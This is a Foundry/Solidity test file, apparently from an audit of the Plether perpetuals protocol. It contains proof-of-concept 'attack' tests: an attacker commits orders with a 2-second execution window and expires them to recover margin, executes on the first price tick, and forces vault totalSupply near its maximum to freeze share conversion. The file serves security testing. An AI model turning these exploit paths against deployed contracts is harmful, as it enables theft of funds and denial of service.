// SPDX-License-Identifier: MIT
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {stdStorage, StdStorage} from "forge-std/StdStorage.sol";

/// Distinguishing G3 attacks against the live Plether pin. Never submit.
contract ApexG3TargetsTest is BasePerpTest {
    using stdStorage for StdStorage;

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);

    IOrderLifecycleBook internal book;

    function setUp() public override {
        super.setUp();
        book = IOrderLifecycleBook(address(router.lifecycleBook()));
        _fundTrader(ATTACKER, 50_000e6);
        _fundTrader(VICTIM, 50_000e6);
    }

    function _openReq(
        bytes32 clientOrderId,
        CfdTypes.Side side,
        uint32 window
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = side;
        request.sizeDelta = 100_000e18;
        request.marginDelta = 10_000e6;
        request.targetPrice = (side == CfdTypes.Side.LONG) ? 1 : type(uint256).max;
        request.isClose = false;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: window,
            allowedExecutionModes: 7,
            expectedConfigHash: book.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commitAs(
        address who,
        OrderV3Types.OrderRequest memory req
    ) internal returns (uint64) {
        vm.prank(who);
        return router.commitOrder(req);
    }

    function test_attack_commitOrder_executionWindow() public {
        uint256 attBefore = clearinghouse.balanceAssets(ATTACKER);
        uint64 oid = _commitAs(ATTACKER, _openReq("w2", CfdTypes.Side.LONG, 2));
        OrderV3Types.OrderTiming memory timing = book.orderTiming(oid);
        require(timing.executionWindowSeconds == 2, "OrderRouter rejected a 2s window");
        require(timing.executionWindowSeconds < 15, "window is not below keeper/settlement floor");
        vm.warp(uint256(timing.executionDeadline) + 1);
        router.expireOrder(oid);
        uint256 attAfter = clearinghouse.balanceAssets(ATTACKER);
        require(attAfter + 2e6 >= attBefore, "expiry did not return attacker margin");
    }

    function test_attack_commitOrder_minPublishTime() public {
        uint64 oid = _commitAs(ATTACKER, _openReq("tick", CfdTypes.Side.LONG, 60));
        require(book.orderTiming(oid).commitTimestamp > 0, "commit missing");
        vm.prank(ATTACKER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(oid, _mockPythUpdateData(1e8));
        require(uint8(result.status) == uint8(OrderV3Types.LifecycleStatus.Executed), "first-tick execute failed");
    }

    function test_attack_convertToShares_totalSupply() public {
        stdstore.target(address(juniorVault)).sig("totalSupply()").checked_write(type(uint256).max - 500);
        try juniorVault.convertToShares(1e6) returns (uint256) {
            revert("convertToShares not frozen at uint max");
        } catch {}
    }

    function test_attack_quoteDepositFromState_totalSupply() public {
        try juniorVault.quoteDepositFromState(1e6, 1e6, type(uint256).max - 500, 0) returns (uint256) {
            revert("quoteDepositFromState not frozen");
        } catch {}
    }

    function test_attack_settleLpEpoch_totalSupply() public {
        stdstore.target(address(juniorVault)).sig("totalSupply()").checked_write(type(uint256).max - 500);
        try juniorVault.convertToShares(1e6) returns (uint256) {
            revert("conversion live after terminal supply");
        } catch {}
    }

}
